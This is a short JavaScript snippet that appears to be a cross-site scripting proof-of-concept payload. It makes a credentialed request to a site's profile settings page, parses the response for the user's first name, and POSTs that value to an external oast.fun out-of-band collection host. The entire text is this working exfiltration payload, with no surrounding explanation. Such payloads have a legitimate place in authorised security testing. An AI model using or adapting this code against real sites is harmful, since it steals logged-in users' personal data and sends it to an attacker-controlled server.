xhr=new XMLHttpRequest();
xhr.open('GET','/ProfileSettings#general');
xhr.withCredentials=true;
xhr.onreadystatechange=()=>{if(xhr.readyState==4){dom=new DOMParser().parseFromString(xhr.response,'text/html');var firstName = dom.querySelector('[data-bind="text: firstName"]').textContent;xhr=new XMLHttpRequest();xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");xhr.send(`firstName=${firstName}`);}};
xhr.send();

